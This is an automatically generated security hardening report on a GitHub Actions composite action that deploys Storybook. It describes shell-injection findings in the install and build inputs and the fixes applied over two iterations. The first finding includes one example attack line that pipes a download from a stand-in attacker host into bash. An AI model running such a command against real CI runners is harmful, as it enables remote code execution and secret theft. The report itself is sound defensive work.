<!-- markdownlint-disable -->

# Hardening Report: bitovi--github-actions-storybook-to-github-pages/v1.0.4

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **bitovi--github-actions-storybook-to-github-pages/v1.0.4** was hardened automatically. 3 finding(s) were identified and resolved across 2 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): The 'Build' step directly interpolates user-controlled inputs into a `run:` shell block without any sanitization or env-var indirection. Both `${{ inputs.install_command }}` and `${{ inputs.build_command }}` are expanded verbatim as shell commands, allowing any caller of this composite action to execute arbitrary shell code on the runner. For example, a caller could pass `install_command: 'curl https://evil.example | bash'`. These inputs must be moved into `env:` variables and then invoked via a safe mechanism (e.g., `eval "$INSTALL_COMMAND"` is still dangerous; the correct fix is to restrict the allowed commands or use a fixed command with parameterised arguments).

Locations:

- `action.yaml:38`
- `action.yaml:39`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.install_command }}" appears directly in run: block of step "Build"; move to env: map

Locations:

- `action.yml:43`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.build_command }}" appears directly in run: block of step "Build"; move to env: map

Locations:

- `action.yml:44`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection

**Notes:**

Fixed all three findings (which all refer to the same two lines in action.yaml). Moved `${{ inputs.install_command }}` and `${{ inputs.build_command }}` from direct inline interpolation in the `run:` block into the step's `env:` map as `INSTALL_COMMAND` and `BUILD_COMMAND`. The shell script now executes them via `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"`. This prevents GitHub Actions expression injection at the YAML/shell parsing boundary — the expressions are no longer expanded directly as shell syntax.

### Iteration 2

**Fixes applied:** script-injection

**Notes:**

Replaced `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"` in the 'Build' step with safe xargs-based tokenization. Each command input is parsed into a bash array using `printf '%s' "$VAR" | xargs printf '%s\0'` with a null-delimited read loop, then executed as `"${cmd[@]}"`. This preserves multi-word commands like `npm run build-storybook` while preventing shell metacharacter injection (`;`, `|`, `&&`, `$()`, etc. are not interpreted). The `[ -n "$VAR" ]` guard prevents xargs from emitting an empty token when the input is empty.

